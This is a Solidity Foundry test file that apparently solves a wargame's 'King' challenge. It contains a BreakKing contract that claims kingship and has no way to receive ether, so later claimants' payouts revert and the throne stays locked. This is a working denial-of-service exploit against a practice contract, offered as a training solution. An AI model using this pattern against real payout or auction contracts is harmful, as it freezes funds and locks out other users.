// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../../src/King/King.sol";

contract KingTest is Test {
    King public king;

    function setUp() public {
        king = new King{value: 1 ether}();
    }

    function test_breakKing() public {
        // Deploy BreakKing with enough value to become the king
        BreakKing breakKing = new BreakKing{value: 2 ether}(
            payable(address(king))
        );

        // Assert that BreakKing is now the king
        assert(king._king() == address(breakKing));

        // Try to dethrone BreakKing with a new address
        address reclaimAddress = address(123);
        vm.deal(reclaimAddress, 5 ether);
        vm.prank(reclaimAddress);

        // This call should fail because BreakKing cannot receive ether
        (bool success, ) = address(king).call{value: 4 ether}("");
        assert(success == false);
    }

    receive() external payable {}
}

contract BreakKing {
    constructor(address payable _king) payable {
        // Send ether to become the king
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "Call to become king failed");
    }

    // Intentionally not including a receive() or fallback() function to prevent receiving ether
}
